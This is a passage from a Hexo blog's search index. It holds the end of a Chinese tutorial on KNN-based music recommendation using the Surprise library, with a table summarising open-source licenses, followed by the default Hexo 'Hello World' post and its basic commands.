将数据集转换成矩阵形式</span></span><br><span class="line">    trainset = data.build_full_trainset()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(trainset.all_items())</span><br><span class="line">    <span class="built_in">print</span>(trainset.all_users())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 基于物品的协同过滤算法，相似度衡量方法：皮尔逊相似度</span></span><br><span class="line">    <span class="comment"># 这是一个用户数量N，矩阵大小为 N*N 的稀疏矩阵，然后get_neighbors得到的是topK个相似用户。如果想要得到相似歌曲，则需要使用基于项目的协同过滤算法，</span></span><br><span class="line">    <span class="comment"># 或者从得到的相似用户中，提取他们的播放记录（这是基于用户的协同过滤算法）</span></span><br><span class="line">    sim_options = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;pearson_baseline&#x27;</span>, <span class="string">&#x27;user_based&#x27;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    <span class="comment"># 选择KNN算法</span></span><br><span class="line">    algo = KNNBaseline(sim_options=sim_options)</span><br><span class="line">    <span class="comment"># algo = KNNBasic(sim_options=sim_options)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练数据集</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始训练······&#x27;</span>)</span><br><span class="line">    algo.fit(trainset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;训练结束!!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> algo</span><br></pre></td></tr></table></figure><p><strong>输出结果集：</strong></p><p>每首音乐的10首相似音乐：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-4.png"></div><p>为每位用户推荐的20首音乐：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-2.png"></div><p>为每位用户推荐的10位相似好友：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-3.png"></div><hr><p>在文章最后，介绍一下github开源项目不同 license 的具体含义</p><div class="center"><table><thead><tr><th>license</th><th>含义</th></tr></thead><tbody><tr><td>Apache</td><td>使用这个协议可以进行商用，可以对其修改、分发，但是要声明作者来源和你的修改以及协议。很多大型项目都使用这个协议，比如 tensorflow、puppeteer。</td></tr><tr><td>MIT</td><td>这是个人用得比较多的协议，因为比较宽松精简，只要声明版权和协议就可以了，可以商用、修改、复制、重新发布等操作。使用这个协议的就有vue、react等</td></tr><tr><td>BSD</td><td>这个和 MIT 协议类似，但未经事先明确书面许可，不得使用版权所有者的姓名或其贡献者的姓名来认可或推广从本软件衍生的产品，其它基本操作都可以使用。flask 用的就是这个协议。</td></tr><tr><td>GNU</td><td>可以私用也可以商用，但是必须声明来源，并且需要声明原有的协议，以及你的代码也必须开源出来。我们很熟悉的 Linux 就是采用这种协议。</td></tr><tr><td>NO</td><td>就是什么都不声明，但是并不意味着就可以乱来，这比声明了协议还严格。你可以使用、商用，但是你需要声明协议和来源，而且，你不能对代码进行修改、复制、再次发布。</td></tr><tr><td>Eclipse</td><td>这个协议允许你商用、复制、修改、再次发布等，需要声明来源和协议。像 java 中的 junit4 就是使用这个协议。</td></tr></tbody></table></div><p>以下以一张图来简单概述协议之间的区别：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-5.png"></div><p>更加详细的说明请查看 <a href="https://opensource.org/licenses/alphabetical">https://opensource.org/licenses/alphabetical</a></p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/08/hello-world/"/>
      <url>/2022/04/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to my Blog! This is my very first post.</p><p>my blog is based on <a href="https://hexo.io/">Hexo</a></p><p>Check: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a> for more info.</p><p>If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask the author on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server-at-localhost">Run server at localhost</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Clear-the-cache-file-and-the-generated-static-file">Clear the cache file and the generated static file</h3><p>When the website shows an exception, you can try this command</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><hr><p><strong>ENDฅฅ</strong></p>]]></content>
      
      
      <categories>
          
          <category> Welcome，欢迎 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Welcome </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
